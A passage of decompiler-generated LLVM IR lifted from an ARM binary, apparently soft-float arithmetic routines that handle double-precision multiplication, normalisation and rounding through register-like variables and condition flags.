  %v4_17a74 = udiv i32 %v2_17a6c, 65536
  %v6_17a74 = add nuw nsw i32 %v8_17a68, %v4_17a74
  %v7_17a74 = zext i1 %v3_17a74 to i32
  %v8_17a74 = add i32 %v6_17a74, %v7_17a74
  %v2_17a78 = mul i32 %v3_17a10, %v6_17a1c
  %v2_17a7c = mul nuw i32 %v3_17a10, %v3_17a0c
  %v4_17a80 = mul i32 %v2_17a78, 65536
  %v5_17a80 = add i32 %v8_17a74, %v4_17a80
  %v2_17a84 = and i32 %v2_17a78, 32768
  %v3_17a84 = icmp ne i32 %v2_17a84, 0
  %v4_17a84 = udiv i32 %v2_17a78, 65536
  %v6_17a84 = add i32 %v4_17a84, %v2_17a7c
  %v7_17a84 = zext i1 %v3_17a84 to i32
  %v2_17a88 = mul i32 %v6_17a20, %v3_17a0c
  %v4_17a8c = mul i32 %v2_17a88, 65536
  %v5_17a8c = add i32 %v5_17a80, %v4_17a8c
  %v2_17a90 = and i32 %v2_17a88, 32768
  %v3_17a90 = icmp ne i32 %v2_17a90, 0
  %v4_17a90 = udiv i32 %v2_17a88, 65536
  %v7_17a90 = zext i1 %v3_17a90 to i32
  %v2_17a94 = mul i32 %v6_17a14, %v6_17a20
  %v2_17a98 = add i32 %v2_17a94, %v5_17a70
  %v3_17a98 = icmp ult i32 %v2_17a98, %v5_17a70
  %v2_17a9c = mul nuw i32 %v3_17a04, %v3_17a10
  %v3_17aa0 = add i32 %v5_17a8c, %v2_17a9c
  %v4_17aa0 = zext i1 %v3_17a98 to i32
  %v5_17aa0 = add i32 %v4_17aa0, %v3_17aa0
  %v9_17aa0 = icmp ule i32 %v5_17aa0, %v5_17a8c
  %v10_17aa0 = icmp ult i32 %v3_17aa0, %v5_17a8c
  %v11_17aa0 = select i1 %v3_17a98, i1 %v9_17aa0, i1 %v10_17aa0
  %v2_17aa4 = mul i32 %v6_17a18, %v6_17a1c
  %v2_17aa8 = zext i1 %v11_17aa0 to i32
  %v2_17aac = add i32 %v2_17aa4, %v2_17a98
  %v3_17aac = icmp ult i32 %v2_17aac, %v2_17a98
  %v0_17ab0 = load i32, i32* %sb.global-to-local, align 4
  %v1_17ab0 = load i32, i32* %r8.global-to-local, align 4
  %v2_17ab0 = mul i32 %v1_17ab0, %v0_17ab0
  %v3_17ab4 = add i32 %v2_17ab0, %v5_17aa0
  %v4_17ab4 = zext i1 %v3_17aac to i32
  %v5_17ab4 = add i32 %v4_17ab4, %v3_17ab4
  %v9_17ab4 = icmp ule i32 %v5_17ab4, %v5_17aa0
  %v10_17ab4 = icmp ult i32 %v3_17ab4, %v5_17aa0
  %v11_17ab4 = select i1 %v3_17aac, i1 %v9_17ab4, i1 %v10_17ab4
  %v2_17ab8 = mul i32 %v1_17ab0, %v3_17a04
  %v2_17abc = zext i1 %v11_17ab4 to i32
  %v8_17a84 = add i32 %v6_17a84, %v4_17a90
  %v6_17a90 = add i32 %v8_17a84, %v7_17a84
  %v8_17a90 = add i32 %v6_17a90, %v7_17a90
  %v3_17aa8 = add i32 %v8_17a90, %v2_17aa8
  %v3_17abc = add i32 %v3_17aa8, %v2_17abc
  %v2_17ac0 = add i32 %v2_17ab8, %v2_17aac
  store i32 %v2_17ac0, i32* %lr.global-to-local, align 4
  %v3_17ac0 = icmp ult i32 %v2_17ac0, %v2_17aac
  %v1_17ac4 = load i32, i32* %r2.global-to-local, align 4
  %v2_17ac4 = mul i32 %v1_17ac4, %v6_17a1c
  %v3_17ac8 = add i32 %v5_17ab4, %v2_17ac4
  %v4_17ac8 = zext i1 %v3_17ac0 to i32
  %v5_17ac8 = add i32 %v4_17ac8, %v3_17ac8
  %v9_17ac8 = icmp ule i32 %v5_17ac8, %v5_17ab4
  %v10_17ac8 = icmp ult i32 %v3_17ac8, %v5_17ab4
  %v11_17ac8 = select i1 %v3_17ac0, i1 %v9_17ac8, i1 %v10_17ac8
  %v2_17acc = zext i1 %v11_17ac8 to i32
  %v3_17acc = add i32 %v2_17acc, %v3_17abc
  %v2_17ad0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v9_17a00, i32* %r8.global-to-local, align 4
  store i32 %v12_17a00, i32* %sb.global-to-local, align 4
  %v0_17ad4 = load i32, i32* %ip.global-to-local, align 4
  %v2_17ad4 = icmp eq i32 %v0_17ad4, 0
  br i1 %v2_17ad4, label %bb45, label %bb44

bb44:                                             ; preds = %dec_label_pc_179fc
  %v2_17ad8 = or i32 %v2_17ac0, 1
  store i32 %v2_17ad8, i32* %lr.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_179fc, %bb44
  %v0_17aec = phi i32 [ %v2_17ac0, %dec_label_pc_179fc ], [ %v2_17ad8, %bb44 ]
  %v0_17adc = load i32, i32* %r4.global-to-local, align 4
  %v1_17adc = add i32 %v0_17adc, -255
  %v2_17ae0 = icmp ugt i32 %v3_17acc, 511
  %v2_17ae4 = icmp eq i1 %v2_17ae0, false
  %v5_17ae4 = sext i1 %v2_17ae4 to i32
  %v3_17ae4 = add nsw i32 %v5_17ae4, -1023
  %v6_17ae4 = add i32 %v3_17ae4, %v0_17adc
  store i32 %v6_17ae4, i32* %r4.global-to-local, align 4
  %v3_17ae8 = icmp ugt i32 %v1_17adc, 768
  br i1 %v3_17ae8, label %dec_label_pc_17af8, label %dec_label_pc_17aec

dec_label_pc_17aec:                               ; preds = %bb45
  %v1_17aec = icmp slt i32 %v0_17aec, 0
  %v2_17aec = mul i32 %v0_17aec, 2
  store i32 %v2_17aec, i32* %lr.global-to-local, align 4
  %v3_17af0 = mul i32 %v5_17ac8, 2
  %v4_17af0 = zext i1 %v1_17aec to i32
  %v5_17af0 = or i32 %v4_17af0, %v3_17af0
  %v9_17af0 = icmp ule i32 %v5_17af0, %v5_17ac8
  %v10_17af0 = icmp ult i32 %v3_17af0, %v5_17ac8
  %v11_17af0 = select i1 %v1_17aec, i1 %v9_17af0, i1 %v10_17af0
  %v3_17af4 = mul i32 %v3_17acc, 2
  %v4_17af4 = zext i1 %v11_17af0 to i32
  %v5_17af4 = or i32 %v4_17af4, %v3_17af4
  br label %dec_label_pc_17af8

dec_label_pc_17af8:                               ; preds = %bb45, %dec_label_pc_17aec
  %v0_17b08 = phi i32 [ %v0_17aec, %bb45 ], [ %v2_17aec, %dec_label_pc_17aec ]
  %v0_17b00 = phi i32 [ %v5_17ac8, %bb45 ], [ %v5_17af0, %dec_label_pc_17aec ]
  %v1_17af8 = phi i32 [ %v3_17acc, %bb45 ], [ %v5_17af4, %dec_label_pc_17aec ]
  %v4_17af8 = mul i32 %v1_17af8, 2048
  %v4_17afc = udiv i32 %v0_17b00, 2097152
  %v5_17af8 = or i32 %v4_17afc, %v2_17ad0
  %v5_17afc = or i32 %v5_17af8, %v4_17af8
  store i32 %v5_17afc, i32* %r0.global-to-local, align 4
  %v3_17b00 = mul i32 %v0_17b00, 2048
  %v4_17b04 = udiv i32 %v0_17b08, 2097152
  %v5_17b04 = or i32 %v3_17b00, %v4_17b04
  store i32 %v5_17b04, i32* %r1.global-to-local, align 4
  %v3_17b08 = mul i32 %v0_17b08, 2048
  store i32 %v3_17b08, i32* %lr.global-to-local, align 4
  %v1_17b0c = add i32 %v6_17ae4, -253
  store i32 %v1_17b0c, i32* %ip.global-to-local, align 4
  %v2_17b0c = icmp ugt i32 %v6_17ae4, 252
  %v7_17b0c = icmp eq i32 %v6_17ae4, 253
  %v2_17b10 = xor i1 %v7_17b0c, true
  %v3_17b10 = and i1 %v2_17b0c, %v2_17b10
  br i1 %v3_17b10, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_17af8
  %v6_17b10 = icmp ugt i32 %v1_17b0c, 1791
  %v11_17b10 = icmp eq i32 %v1_17b0c, 1792
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_17af8, %bb46
  %v1_17b14 = phi i1 [ %v7_17b0c, %dec_label_pc_17af8 ], [ %v11_17b10, %bb46 ]
  %v0_17b14 = phi i1 [ %v2_17b0c, %dec_label_pc_17af8 ], [ %v6_17b10, %bb46 ]
  %v2_17b14 = xor i1 %v1_17b14, true
  %v3_17b14 = and i1 %v0_17b14, %v2_17b14
  call void @__pseudo_cond_branch(i1 %v3_17b14, i32 ptrtoint (i32* @global_var_17b58.659 to i32))
  %v0_17b18 = load i32, i32* %lr.global-to-local, align 4
  %v2_17b18 = icmp slt i32 %v0_17b18, 0
  %v6_17b18 = icmp eq i32 %v0_17b18, -2147483648
  %v1_17b1c = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_17b18, label %bb48, label %._crit_edge

bb48:                                             ; preds = %bb47
  %v2_17b1c = urem i32 %v1_17b1c, 2
  %v3_17b1c = icmp ne i32 %v2_17b1c, 0
  %v4_17b1c = udiv i32 %v1_17b1c, 2
  store i32 %v4_17b1c, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb47, %bb48
  %v1_17b20 = phi i1 [ %v3_17b1c, %bb48 ], [ %v2_17b18, %bb47 ]
  %v2_17b20 = zext i1 %v1_17b20 to i32
  %v3_17b20 = add i32 %v2_17b20, %v1_17b1c
  store i32 %v3_17b20, i32* %r1.global-to-local, align 4
  %v0_17b24 = load i32, i32* %r0.global-to-local, align 4
  %v1_17b24 = load i32, i32* %r4.global-to-local, align 4
  %v2_17b24 = and i32 %v1_17b24, 4096
  %v3_17b24 = icmp ne i32 %v2_17b24, 0
  %v4_17b24 = mul i32 %v1_17b24, 1048576
  %v6_17b24 = add i32 %v4_17b24, %v0_17b24
  %v7_17b24 = zext i1 %v3_17b24 to i32
  %v8_17b24 = add i32 %v7_17b24, %v6_17b24
  store i32 %v8_17b24, i32* %r0.global-to-local, align 4
  %v2_17b28 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17b28, i32* %r4.global-to-local, align 4
  ret i32 %v8_17b24

dec_label_pc_17b2c:                               ; preds = %.thread, %bb43
  %v1_17b2c22 = phi i32 [ %v1_17b2c19, %.thread ], [ %v1_17b2c, %bb43 ]
  %v1_179f421 = phi i32 [ %v1_179f418, %.thread ], [ %v1_179f4, %bb43 ]
  %v1_179f020 = phi i32 [ %v1_179f017, %.thread ], [ %v1_179f0, %bb43 ]
  %v2_17b30 = or i32 %v1_179f020, %v1_17b2c22
  %v2_17b34 = or i32 %arg4, %arg2
  store i32 %v2_17b34, i32* %r1.global-to-local, align 4
  %v2_17b38 = xor i32 %v2_17b30, %v1_179f421
  store i32 %v2_17b38, i32* %r0.global-to-local, align 4
  %v4_17b3c = udiv i32 %v1_179e0, 2
  %v5_17b3c = sub i32 %v2_179d8, %v4_17b3c
  store i32 %v5_17b3c, i32* %r4.global-to-local, align 4
  %v7_17b3c = sub i32 0, %v5_17b3c
  %v8_17b3c = and i32 %v2_179d8, %v7_17b3c
  %v11_17b3c = icmp eq i32 %v2_179d8, %v4_17b3c
  %v7_17b40 = icmp sgt i32 %v2_179d8, %v4_17b3c
  br i1 %v7_17b40, label %bb49, label %bb50

bb49:                                             ; preds = %dec_label_pc_17b2c
  %v10_17b40 = sub i32 %v1_179e0, %v5_17b3c
  %v12_17b40 = xor i32 %v5_17b3c, %v1_179e0
  %v13_17b40 = xor i32 %v10_17b40, %v1_179e0
  %v14_17b40 = and i32 %v13_17b40, %v12_17b40
  %v17_17b40 = icmp eq i32 %v1_179e0, %v5_17b3c
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_17b2c, %bb49
  %v2_17b48.in = phi i32 [ %v8_17b3c, %dec_label_pc_17b2c ], [ %v14_17b40, %bb49 ]
  %v1_17b48.in = phi i32 [ %v5_17b3c, %dec_label_pc_17b2c ], [ %v10_17b40, %bb49 ]
  %v0_17b48 = phi i1 [ %v11_17b3c, %dec_label_pc_17b2c ], [ %v17_17b40, %bb49 ]
  %v1_17b48 = icmp slt i32 %v1_17b48.in, 0
  %v2_17b48 = icmp slt i32 %v2_17b48.in, 0
  %v3_17b44 = xor i1 %v2_17b48, %v1_17b48
  %v4_17b44 = or i1 %v0_17b48, %v3_17b44
  br i1 %v4_17b44, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v9_17b4428 = mul i32 %v5_17b3c, 1048576
  %v10_17b4429 = or i32 %v2_17b38, %v9_17b4428
  store i32 %v10_17b4429, i32* %r0.global-to-local, align 4
  %v7_17b48 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_17b48, i32* %r4.global-to-local, align 4
  ret i32 %v10_17b4429

bb52:                                             ; preds = %bb50
  %v1_17b4c = or i32 %v2_17b38, 1048576
  store i32 %v1_17b4c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_17b54 = add i32 %v5_17b3c, -1
  store i32 %v1_17b54, i32* %r4.global-to-local, align 4
  ret i32 %v1_17b4c

; uselistorder directives
  uselistorder i32 %v5_17b3c, { 4, 1, 0, 6, 3, 5, 2, 7 }
  uselistorder i32 %v4_17b3c, { 2, 1, 0 }
  uselistorder i32 %v2_17b38, { 1, 0, 2 }
  uselistorder i32 %v1_17b1c, { 2, 0, 1 }
  uselistorder i32 %v0_17b18, { 1, 0 }
  uselistorder i1 %v7_17b0c, { 1, 0 }
  uselistorder i32 %v2_17aec, { 1, 0 }
  uselistorder i1 %v1_17aec, { 1, 0 }
  uselistorder i32 %v6_17ae4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_17aec, { 1, 0, 2 }
  uselistorder i32 %v3_17acc, { 1, 0, 2 }
  uselistorder i32 %v5_17ac8, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v3_17ac8, { 1, 0 }
  uselistorder i1 %v3_17ac0, { 1, 0 }
  uselistorder i32 %v5_17ab4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_17ab4, { 1, 0 }
  uselistorder i1 %v3_17aac, { 1, 0 }
  uselistorder i32 %v2_17aac, { 1, 0, 2 }
  uselistorder i32 %v5_17aa0, { 2, 1, 0, 3 }
  uselistorder i32 %v3_17aa0, { 1, 0 }
  uselistorder i1 %v3_17a98, { 1, 0 }
  uselistorder i32 %v2_17a98, { 1, 0, 2 }
  uselistorder i32 %v5_17a8c, { 2, 1, 0 }
  uselistorder i32 %v2_17a88, { 1, 2, 0 }
  uselistorder i32 %v2_17a78, { 0, 2, 1 }
  uselistorder i32 %v5_17a70, { 1, 0 }
  uselistorder i32 %v2_17a6c, { 1, 2, 0 }
  uselistorder i32 %v2_17a60, { 1, 0, 2 }
  uselistorder i32 %v2_17a54, { 1, 0, 2 }
  uselistorder i32 %v2_17a44, { 1, 0, 2 }
  uselistorder i32 %v2_17a38, { 0, 2, 1 }
  uselistorder i32 %v2_17a28, { 1, 0, 2 }
  uselistorder i32 %v6_17a20, { 1, 0, 2, 3 }
  uselistorder i32 %v6_17a1c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v6_17a14, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_17a10, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v3_17a0c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v3_17a08, { 3, 2, 0, 1 }
  uselistorder i32 %v3_17a04, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_179f4, { 1, 0, 2 }
  uselistorder i32 %v1_179f0, { 1, 0, 2 }
  uselistorder i32 %v6_179e4, { 0, 2, 1, 3 }
  uselistorder i32 %v6_179e0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_179e0, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_179dc, { 1, 0 }
  uselistorder i32 %v2_179d8, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v6_179c8, { 2, 1, 0 }
  uselistorder i32 %v5_179c4, { 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 1, 10, 0 }
  uselistorder i32 32768, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 1, 0, 13, 12 }
  uselistorder i32 65536, { 2, 0, 3, 90, 4, 91, 1, 5, 6, 7, 8, 92, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 28, 24, 29, 25, 30, 26, 31, 27, 32, 33, 34, 38, 35, 39, 36, 40, 37, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 93, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 82, 85, 87, 88, 86, 89, 94 }
  uselistorder i32* @sb, { 6, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 4, 5, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 1, 2, 7, 8, 9, 10, 11, 12, 0, 13, 3 }
  uselistorder i32* @r8, { 21, 32, 33, 34, 35, 36, 37, 38, 7, 8, 9, 39, 44, 45, 0, 46, 81, 82, 83, 84, 1, 85, 86, 87, 88, 96, 97, 10, 11, 12, 13, 14, 15, 16, 95, 89, 90, 91, 92, 93, 94, 3, 22, 23, 24, 25, 26, 27, 5, 6, 4, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 2, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 28, 29, 30, 31, 40, 41, 42, 43, 17, 18, 19, 20 }
  uselistorder i32 %arg4, { 1, 2, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 3, 1, 4 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_17b2c, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_17af8, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @function_17b58(i32 %arg1) local_unnamed_addr {
dec_label_pc_17b58:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v0_17b58 = load i1, i1* @cpsr_z, align 1
  %v1_17b58 = load i1, i1* @cpsr_n, align 1
  %v2_17b58 = load i1, i1* @cpsr_v, align 1
  %v3_17b58 = xor i1 %v1_17b58, %v2_17b58
  %v4_17b58 = or i1 %v0_17b58, %v3_17b58
  br i1 %v4_17b58, label %dec_label_pc_17b5c, label %dec_label_pc_17cc0

dec_label_pc_17b5c:                               ; preds = %dec_label_pc_17b58
  %v0_17b5c = load i32, i32* @r4, align 4
  %v4_17b5c = add i32 %v0_17b5c, 54
  %v6_17b5c = sub i32 0, %v0_17b5c
  %v7_17b5c = and i32 %v4_17b5c, %v6_17b5c
  %v8_17b5c = icmp slt i32 %v7_17b5c, 0
  store i1 %v8_17b5c, i1* @cpsr_v, align 1
  %v9_17b5c = icmp slt i32 %v4_17b5c, 0
  store i1 %v9_17b5c, i1* @cpsr_n, align 1
  %v10_17b5c = icmp eq i32 %v4_17b5c, 0
  store i1 %v10_17b5c, i1* @cpsr_z, align 1
  %v7_17b60 = icmp sgt i32 %v0_17b5c, -54
  br i1 %v7_17b60, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_17b5c
  store i32 0, i32* @r1, align 4
  %v8_17b64 = load i32, i32* %r0.global-to-local, align 4
  %v9_17b64 = and i32 %v8_17b64, -2147483648
  store i32 %v9_17b64, i32* %r0.global-to-local, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v9_17b64

bb6:                                              ; preds = %dec_label_pc_17b5c
  %v1_17b6c = sub i32 0, %v0_17b5c
  %v2_17b70 = sub i32 -32, %v0_17b5c
  %v4_17b70 = add i32 %v0_17b5c, 31
  %v5_17b70 = and i32 %v4_17b70, %v1_17b6c
  %v6_17b70 = icmp slt i32 %v5_17b70, 0
  store i1 %v6_17b70, i1* @cpsr_v, align 1
  %v6_17b74 = icmp slt i32 %v1_17b6c, 32
  br i1 %v6_17b74, label %dec_label_pc_17b78, label %dec_label_pc_17bdc

dec_label_pc_17b78:                               ; preds = %bb6
  %v1_17b78 = add i32 %v2_17b70, 12
  %v8_17b7c = icmp sgt i32 %v1_17b78, 0
  br i1 %v8_17b7c, label %dec_label_pc_17bb0, label %dec_label_pc_17b80

dec_label_pc_17b80:                               ; preds = %dec_label_pc_17b78
  %v1_17b80 = add i32 %v2_17b70, 32
  %v1_17b84 = sub i32 0, %v2_17b70
  %v0_17b88 = load i32, i32* @r1, align 4
  %v6_17b88 = shl i32 %v0_17b88, %v1_17b84
  %v2_17b8c = add i32 %v2_17b70, 31
  %v3_17b8c = shl i32 1, %v2_17b8c
  %v6_17b8c = lshr i32 %v0_17b88, %v1_17b80
  %v1_17b90 = load i32, i32* %r0.global-to-local, align 4
  %v7_17b90 = shl i32 %v1_17b90, %v1_17b84
  %v8_17b90 = or i32 %v7_17b90, %v6_17b8c
  %v1_17b94 = and i32 %v1_17b90, -2147483648
  %tmp = bitcast i32 %v1_17b90 to float
  %tmp13 = call float @fabsf(float %tmp)
  %v1_17b98 = bitcast float %tmp13 to i32
  %tmp14 = icmp slt i32 %v6_17b88, 0
  %v4_17b9c = zext i1 %tmp14 to i32
  %v5_17b9c = add i32 %v8_17b90, %v4_17b9c
  store i32 %v5_17b9c, i32* @r1, align 4
  %v5_17ba0 = and i32 %v1_17b98, %v3_17b8c
  %v6_17ba0 = icmp ne i32 %v5_17ba0, 0
  %v7_17ba0 = lshr i32 %v1_17b98, %v1_17b80
  %v9_17ba0 = add i32 %v7_17ba0, %v1_17b94
  %v10_17ba0 = zext i1 %v6_17ba0 to i32
  %v11_17ba0 = add i32 %v9_17ba0, %v10_17ba0
  store i32 %v11_17ba0, i32* %r0.global-to-local, align 4
  %v19_17ba0 = add i32 %v11_17ba0, %v10_17ba0
  %v20_17ba0 = xor i32 %v19_17ba0, %v1_17b90
  %v21_17ba0 = xor i32 %v19_17ba0, %v7_17ba0
  %v22_17ba0 = and i32 %v20_17ba0, %v21_17ba0
  %v23_17ba0 = icmp slt i32 %v22_17ba0, 0
  store i1 %v23_17ba0, i1* @cpsr_v, align 1
  %v0_17ba4 = load i32, i32* @lr, align 4
  %v3_17ba4 = mul i32 %v6_17b88, 2
  %v4_17ba4 = or i32 %v0_17ba4, %v3_17ba4
  %v5_17ba4 = icmp slt i32 %v4_17ba4, 0
  store i1 %v5_17ba4, i1* @cpsr_n, align 1
  %v6_17ba4 = icmp eq i32 %v4_17ba4, 0
  store i1 %v6_17ba4, i1* @cpsr_z, align 1
  br i1 %v6_17ba4, label %bb7, label %bb8

bb7:                                              ; preds = %dec_label_pc_17b80
  %tmp15 = sext i1 %tmp14 to i32
  %v6_17ba8 = add nsw i32 %tmp15, -1
  %v7_17ba8 = and i32 %v5_17b9c, %v6_17ba8
  store i32 %v7_17ba8, i32* @r1, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_17b80, %bb7
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v11_17ba0

dec_label_pc_17bb0:                               ; preds = %dec_label_pc_17b78
  %v1_17bb0 = sub i32 0, %v2_17b70
  %v1_17bb4 = add i32 %v2_17b70, 32
  %v0_17bb8 = load i32, i32* @r1, align 4
  %v6_17bb8 = shl i32 %v0_17bb8, %v1_17bb0
  %v6_17bbc = lshr i32 %v0_17bb8, %v1_17bb4
  %v1_17bc0 = load i32, i32* %r0.global-to-local, align 4
  %v7_17bc0 = shl i32 %v1_17bc0, %v1_17bb0
  %v8_17bc0 = or i32 %v7_17bc0, %v6_17bbc
  %v1_17bc4 = and i32 %v1_17bc0, -2147483648
  %tmp16 = icmp slt i32 %v6_17bb8, 0
  %v4_17bc8 = zext i1 %tmp16 to i32
  %v5_17bc8 = add i32 %v8_17bc0, %v4_17bc8
  store i32 %v5_17bc8, i32* @r1, align 4
  %v6_17bc8 = icmp ult i32 %v5_17bc8, %v8_17bc0
  %v2_17bcc = zext i1 %v6_17bc8 to i32
  %v3_17bcc = or i32 %v2_17bcc, %v1_17bc4
  store i32 %v3_17bcc, i32* %r0.global-to-local, align 4
  %v9_17bcc = add nsw i32 %v3_17bcc, %v2_17bcc
  %v10_17bcc = sub i32 0, %v1_17bc0
  %v11_17bcc = and i32 %v9_17bcc, %v10_17bcc
  %v12_17bcc = icmp slt i32 %v11_17bcc, 0
  store i1 %v12_17bcc, i1* @cpsr_v, align 1
  %v0_17bd0 = load i32, i32* @lr, align 4
  %v3_17bd0 = mul i32 %v6_17bb8, 2
  %v4_17bd0 = or i32 %v0_17bd0, %v3_17bd0
  %v5_17bd0 = icmp slt i32 %v4_17bd0, 0
  store i1 %v5_17bd0, i1* @cpsr_n, align 1
  %v6_17bd0 = icmp eq i32 %v4_17bd0, 0
  store i1 %v6_17bd0, i1* @cpsr_z, align 1
  br i1 %v6_17bd0, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_17bb0
  %tmp17 = sext i1 %tmp16 to i32
  %v6_17bd4 = add nsw i32 %tmp17, -1
  %v7_17bd4 = and i32 %v5_17bc8, %v6_17bd4
  store i32 %v7_17bd4, i32* @r1, align 4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17bb0, %bb9
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v3_17bcc

dec_label_pc_17bdc:                               ; preds = %bb6
  %v1_17bdc = sub i32 32, %v2_17b70
  %v0_17be0 = load i32, i32* @lr, align 4
  %v1_17be0 = load i32, i32* @r1, align 4
  %v7_17be0 = shl i32 %v1_17be0, %v1_17bdc
  %v8_17be0 = or i32 %v7_17be0, %v0_17be0
  %v6_17be4 = lshr i32 %v1_17be0, %v2_17b70
  %v1_17be8 = load i32, i32* %r0.global-to-local, align 4
  %v7_17be8 = shl i32 %v1_17be8, %v1_17bdc
  %v8_17be8 = or i32 %v7_17be8, %v6_17be4
  %v6_17bec = lshr i32 %v1_17be8, %v2_17b70
  %v1_17bf0 = and i32 %v1_17be8, -2147483648
  store i32 %v1_17bf0, i32* %r0.global-to-local, align 4
  %v7_17bf4 = lshr i32 %v1_17bf0, %v2_17b70
  %v8_17bf4 = sub i32 -1, %v7_17bf4
  %v9_17bf4 = and i32 %v6_17bec, %v8_17bf4
  %tmp18 = icmp slt i32 %v8_17be8, 0
  %v4_17bf8 = zext i1 %tmp18 to i32
  %v5_17bf8 = add i32 %v4_17bf8, %v9_17bf4
  store i32 %v5_17bf8, i32* @r1, align 4
  %v3_17bfc = mul i32 %v8_17be8, 2
  %v4_17bfc = or i32 %v8_17be0, %v3_17bfc
  %v5_17bfc = icmp slt i32 %v4_17bfc, 0
  store i1 %v5_17bfc, i1* @cpsr_n, align 1
  %v6_17bfc = icmp eq i32 %v4_17bfc, 0
  store i1 %v6_17bfc, i1* @cpsr_z, align 1
  br i1 %v6_17bfc, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_17bdc
  %tmp19 = sext i1 %tmp18 to i32
  %v6_17c00 = add nsw i32 %tmp19, -1
  %v7_17c00 = and i32 %v5_17bf8, %v6_17c00
  store i32 %v7_17c00, i32* @r1, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_17bdc, %bb11
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_17bf0

dec_label_pc_17cc0:                               ; preds = %dec_label_pc_17b58
  %v0_17cc0 = load i32, i32* %r0.global-to-local, align 4
  %v1_17cc0 = and i32 %v0_17cc0, -2147483648
  %v1_17cc8 = or i32 %v1_17cc0, 2146435072
  store i32 %v1_17cc8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_17cc8

; uselistorder directives
  uselistorder i32 %v3_17bcc, { 2, 0, 1 }
  uselistorder i32 %v8_17bc0, { 1, 0 }
  uselistorder i32 %v1_17bb0, { 1, 0 }
  uselistorder i32 %v11_17ba0, { 1, 0, 2 }
  uselistorder i32 %v1_17b90, { 1, 0, 2, 3 }
  uselistorder i32 %v1_17b84, { 1, 0 }
  uselistorder i32 %v2_17b70, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_17b6c, { 1, 0 }
  uselistorder i32 %v4_17b5c, { 1, 2, 0 }
  uselistorder i32 %v0_17b5c, { 3, 2, 1, 4, 0, 5 }
  uselistorder i32 %tmp4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp2, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 7, 1, 8, 2, 9, 3, 10, 4, 5 }
